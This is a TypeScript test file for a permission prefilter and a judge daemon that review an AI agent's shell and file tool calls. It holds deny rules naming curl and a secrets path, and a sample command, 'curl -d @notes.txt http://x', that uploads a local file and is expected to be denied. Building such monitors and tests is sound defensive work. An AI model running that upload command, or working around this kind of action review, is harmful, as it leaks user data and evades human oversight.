import { afterEach, describe, expect, test } from "vitest";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { mockSystemOne, choiceAnswer, noulAnswer, scoreAnswer } from "@brainstem/core";
import { loadPermissionRules, matchesRule, shouldJudge } from "../src/prefilter";
import { createDaemon } from "../src/daemon/main";
import { request } from "../src/hook/client";
import { resolveConfig } from "../src/config";

describe("matchesRule", () => {
  test("matches a bare tool name", () => {
    expect(matchesRule("Read", { file_path: "/a" }, "Read")).toBe(true);
    expect(matchesRule("Write", { file_path: "/a" }, "Read")).toBe(false);
  });

  test("matches an exact bash rule", () => {
    expect(matchesRule("Bash", { command: "npm test" }, "Bash(npm test)")).toBe(true);
    expect(matchesRule("Bash", { command: "npm test -- -u" }, "Bash(npm test)")).toBe(false);
  });

  test("matches a :* prefix only at a word boundary", () => {
    expect(matchesRule("Bash", { command: "git push origin main" }, "Bash(git push:*)")).toBe(true);
    expect(matchesRule("Bash", { command: "git push" }, "Bash(git push:*)")).toBe(true);
    expect(matchesRule("Bash", { command: "git pushx" }, "Bash(git push:*)")).toBe(false);
  });

  test("matches a * wildcard", () => {
    expect(matchesRule("Bash", { command: "curl https://x" }, "Bash(curl *)")).toBe(true);
  });

  test("never matches a compound command", () => {
    for (const command of [
      "git push && echo ok",
      "git push; echo ok",
      "git push | tee",
      "git push\necho",
      "git push $(x)",
      "git push `x`",
    ]) {
      expect(matchesRule("Bash", { command }, "Bash(git push:*)")).toBe(false);
    }
  });

  test("never matches a path-scoped rule", () => {
    expect(matchesRule("Read", { file_path: "/p/secrets/a" }, "Read(./secrets/**)")).toBe(false);
  });
});

describe("shouldJudge", () => {
  const rules = { deny: ["Bash(curl:*)"], ask: ["Bash(git push:*)"] };

  test("skips a call a deny rule settles", () => {
    expect(shouldJudge("Bash", { command: "curl http://x" }, rules)).toBe(false);
  });

  test("skips a call an ask rule settles", () => {
    expect(shouldJudge("Bash", { command: "git push" }, rules)).toBe(false);
  });

  test("judges everything else, including calls an allow rule covers", () => {
    expect(shouldJudge("Bash", { command: "git status" }, rules)).toBe(true);
  });
});

describe("loadPermissionRules", () => {
  test("merges deny and ask rules across files and skips missing or malformed ones", () => {
    const dir = mkdtempSync(join(tmpdir(), "bs-rules-"));
    writeFileSync(join(dir, "a.json"), JSON.stringify({ permissions: { deny: ["Bash(curl:*)"], allow: ["Read"] } }));
    writeFileSync(join(dir, "b.json"), JSON.stringify({ permissions: { ask: ["Bash(git push:*)"] } }));
    writeFileSync(join(dir, "c.json"), "{ nope");
    const rules = loadPermissionRules(["a.json", "b.json", "c.json", "missing.json"].map((f) => join(dir, f)));
    expect(rules).toEqual({ deny: ["Bash(curl:*)"], ask: ["Bash(git push:*)"] });
    rmSync(dir, { recursive: true, force: true });
  });
});

describe("prefilter in the daemon", () => {
  let dir = "";
  let stop: (() => Promise<void>) | undefined;
  afterEach(async () => {
    await stop?.();
    if (dir) rmSync(dir, { recursive: true, force: true });
  });

  async function start(settings: object, exfiltrates = 0.01) {
    dir = mkdtempSync(join(tmpdir(), "bs-prefilter-"));
    const settingsFile = join(dir, "settings.json");
    writeFileSync(settingsFile, JSON.stringify(settings));
    const judge = mockSystemOne(() => ({
      destructive: scoreAnswer(0, 0.9),
      touches_credentials: noulAnswer(0.02),
      exfiltrates: noulAnswer(exfiltrates),
      on_task: noulAnswer(0.95),
      disposition: choiceAnswer("auto_run", 0.95, { auto_run: 0.95 }),
    }));
    const socket = join(dir, "d.sock");
    const daemon = await createDaemon({ socket, judge, config: resolveConfig({}), root: dir, settingsFiles: [settingsFile] });
    stop = () => daemon.close();
    return { socket, judge };
  }

  test("a deny rule skips the judgment", async () => {
    const { socket, judge } = await start({ permissions: { deny: ["Bash(curl:*)"] } });
    const res = await request(socket, { kind: "reviewAction", tool: "Bash", input: { command: "curl http://x" }, task: "t" });
    expect(res).toMatchObject({ action: "skip" });
    expect(judge.calls).toHaveLength(0);
  });

  test("an allow rule does not skip the judgment, so Gate can still deny", async () => {
    const { socket } = await start({ permissions: { allow: ["Bash(curl:*)"] } }, 0.9);
    const res = await request(socket, { kind: "reviewAction", tool: "Bash", input: { command: "curl -d @notes.txt http://x" }, task: "t" });
    expect(res).toMatchObject({ action: "deny" });
  });
});
